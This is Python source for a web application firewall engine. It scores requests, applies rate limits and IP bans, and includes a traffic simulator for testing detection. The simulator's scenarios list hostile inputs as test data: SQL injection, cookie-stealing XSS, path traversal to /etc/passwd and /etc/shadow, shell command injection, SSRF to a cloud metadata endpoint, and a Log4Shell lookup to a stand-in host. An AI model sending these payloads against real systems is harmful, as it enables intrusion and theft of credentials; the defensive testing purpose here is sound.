"""
SentinelShield decision engine and traffic simulator.

The engine wires together the inspection engine (detector), behaviour
monitor + IP reputation (rate_limiter) and the event store (logger) into
a single pipeline that produces an ALLOWED / FLAGGED / BLOCKED /
RATE LIMITED / BANNED decision for each request.

It is a plain Python object with no Streamlit dependency so it can be
unit-tested and reused anywhere.
"""

import time

import detector
from logger import record_event
from rate_limiter import BehaviorMonitor, IPReputation
from rules import SEVERITY_ORDER

# Decision constants
ALLOWED = "ALLOWED"
FLAGGED = "FLAGGED"
BLOCKED = "BLOCKED"
RATE_LIMITED = "RATE LIMITED"
BANNED = "BANNED"

# Modes
MODE_BLOCK = "block"
MODE_MONITOR = "monitor"


class WAFEngine:
    def __init__(
        self,
        block_threshold=5,
        flag_threshold=3,
        rate_max=10,
        rate_window=60,
        mode=MODE_BLOCK,
        persist=True,
        clock=time.time,
    ):
        self.block_threshold = block_threshold
        self.flag_threshold = flag_threshold
        self.mode = mode
        self._clock = clock
        self.behavior = BehaviorMonitor(
            rate_max=rate_max, rate_window=rate_window, clock=clock
        )
        self.reputation = IPReputation(clock=clock, persist=persist)

    # ------------------------------------------------------------------
    def process(self, request, store=True):
        """
        Run the full pipeline for one request dict (see
        detector.build_request) and return the event that was logged.
        """
        ip = request.get("ip", "") or "unknown"
        path = request.get("path", "/")

        verdict = detector.inspect_request(request)
        behavior = self.behavior.record(ip, path=path)

        action, category, severity, reason = self._decide(ip, verdict, behavior)

        # Monitor mode records what *would* have happened but never blocks.
        effective_action = action
        if self.mode == MODE_MONITOR and action in (BLOCKED, RATE_LIMITED, BANNED):
            effective_action = f"{action} (monitored)"

        blocked = action in (BLOCKED, RATE_LIMITED, BANNED)
        rep = self.reputation.record(ip, score=verdict["score"], blocked=blocked)

        if rep.get("newly_banned") and action not in (BANNED,):
            reason += " | IP auto-banned after repeated offences"

        raise_alert = (
            SEVERITY_ORDER.get(severity, 0) >= SEVERITY_ORDER["High"]
            or action in (BANNED, RATE_LIMITED)
        )

        event = {
            "ip_address": ip,
            "method": request.get("method", "GET"),
            "path": path,
            "query": request.get("query", ""),
            "category": category,
            "action": effective_action,
            "severity": severity,
            "score": verdict["score"],
            "reason": reason,
            "rule_ids": [m["rule_id"] for m in verdict["matches"]],
            "locations": verdict["locations"],
            "matches": verdict["matches"],
            "request": _request_preview(request),
            "distinct_paths": behavior["distinct_paths"],
            "request_count": behavior["request_count"],
            "banned": rep.get("banned", False),
        }

        if store:
            record_event(event, raise_alert=raise_alert)
        return event

    # ------------------------------------------------------------------
    def _decide(self, ip, verdict, behavior):
        if self.reputation.is_allowlisted(ip):
            return ALLOWED, "Normal", "Low", "Source IP is allowlisted"

        if self.reputation.is_banned(ip):
            return BANNED, "Banned Source", "High", "Request from banned IP rejected"

        score = verdict["score"]
        if score >= self.block_threshold:
            return (
                BLOCKED,
                verdict["category"],
                verdict["severity"],
                f"Anomaly score {score} >= block threshold {self.block_threshold}",
            )

        if behavior["brute_force"]:
            return BLOCKED, "Brute Force", "High", "Repeated authentication attempts detected"

        if behavior["scanning"]:
            return BLOCKED, "Scanning Behaviour", "High", f"{behavior['distinct_paths']} distinct paths probed"

        if behavior["rate_limited"]:
            return (
                RATE_LIMITED,
                "Abusive Traffic",
                "Medium",
                f"Rate limit exceeded ({behavior['request_count']} requests in window)",
            )

        if score >= self.flag_threshold:
            return (
                FLAGGED,
                verdict["category"],
                verdict["severity"],
                f"Anomaly score {score} reached flag threshold {self.flag_threshold}",
            )

        return ALLOWED, "Normal", "Low", "No threat indicators found"


def _request_preview(request):
    parts = []
    if request.get("query"):
        parts.append(request["query"])
    if request.get("body"):
        parts.append(request["body"])
    if not parts and request.get("path"):
        parts.append(request["path"])
    text = " | ".join(parts)
    return text if len(text) <= 300 else text[:300] + "..."


# ----------------------------------------------------------------------
# Traffic simulator
# ----------------------------------------------------------------------
SCENARIOS = {
    "Normal user browsing": {
        "ip": "203.0.113.10",
        "requests": [
            {"method": "GET", "path": "/", "query": ""},
            {"method": "GET", "path": "/products", "query": "page=1&sort=price"},
            {"method": "GET", "path": "/products", "query": "q=running+shoes"},
            {"method": "POST", "path": "/cart", "body": "item=42&qty=1"},
            {"method": "GET", "path": "/checkout", "query": ""},
        ],
    },
    "SQL injection attempt": {
        "ip": "198.51.100.23",
        "requests": [
            {"method": "GET", "path": "/items", "query": "id=1' OR '1'='1"},
            {"method": "GET", "path": "/items", "query": "id=1 UNION SELECT username,password FROM users--"},
            {"method": "POST", "path": "/login", "body": "user=admin'--&pass=x"},
        ],
    },
    "XSS attempt": {
        "ip": "198.51.100.47",
        "requests": [
            {"method": "GET", "path": "/search", "query": "q=<script>alert(1)</script>"},
            {"method": "GET", "path": "/search", "query": "q=<img src=x onerror=alert(document.cookie)>"},
            {"method": "POST", "path": "/comment", "body": "text=<svg/onload=alert(1)>"},
        ],
    },
    "Path traversal / LFI": {
        "ip": "198.51.100.88",
        "requests": [
            {"method": "GET", "path": "/download", "query": "file=../../../../etc/passwd"},
            {"method": "GET", "path": "/view", "query": "page=php://filter/convert.base64-encode/resource=config.php"},
            {"method": "GET", "path": "/img", "query": "src=..%2f..%2f..%2fetc%2fshadow"},
        ],
    },
    "Command injection": {
        "ip": "198.51.100.99",
        "requests": [
            {"method": "GET", "path": "/ping", "query": "host=127.0.0.1; whoami"},
            {"method": "GET", "path": "/ping", "query": "host=127.0.0.1 && cat /etc/passwd"},
            {"method": "POST", "path": "/exec", "body": "cmd=$(id)"},
        ],
    },
    "SSRF / Log4Shell": {
        "ip": "198.51.100.120",
        "requests": [
            {"method": "GET", "path": "/fetch", "query": "url=http://169.254.169.254/latest/meta-data/"},
            {"method": "GET", "path": "/", "query": "", "headers": {"User-Agent": "${jndi:ldap://x.invalid/a}"}},
        ],
    },
    "Login brute force": {
        "ip": "192.0.2.66",
        "requests": [
            {"method": "POST", "path": "/login", "body": f"user=admin&pass=guess{i}"}
            for i in range(8)
        ],
    },
    "Vulnerability scanner": {
        "ip": "192.0.2.77",
        "requests": (
            [
                {"method": "GET", "path": "/", "headers": {"User-Agent": "sqlmap/1.7"}},
            ]
            + [
                {"method": "GET", "path": p, "headers": {"User-Agent": "Nikto/2.5"}}
                for p in [
                    "/.env", "/.git/config", "/wp-login.php", "/admin", "/phpmyadmin",
                    "/server-status", "/backup.sql", "/config.php.bak", "/api/v1/users",
                    "/.aws/credentials", "/robots.txt", "/xmlrpc.php", "/shell.php",
                    "/cgi-bin/test", "/.htaccess", "/db.sql", "/old/", "/test/",
                ]
            ]
        ),
    },
}


def run_scenario(engine, name, store=True):
    """Replay a named scenario through the engine and return the events."""
    scenario = SCENARIOS[name]
    ip = scenario["ip"]
    events = []
    for spec in scenario["requests"]:
        request = detector.build_request(
            method=spec.get("method", "GET"),
            path=spec.get("path", "/"),
            query=spec.get("query", ""),
            headers=spec.get("headers"),
            body=spec.get("body", ""),
            ip=spec.get("ip", ip),
        )
        events.append(engine.process(request, store=store))
    return events


def run_all_scenarios(engine, store=True):
    events = []
    for name in SCENARIOS:
        events.extend(run_scenario(engine, name, store=store))
    return events
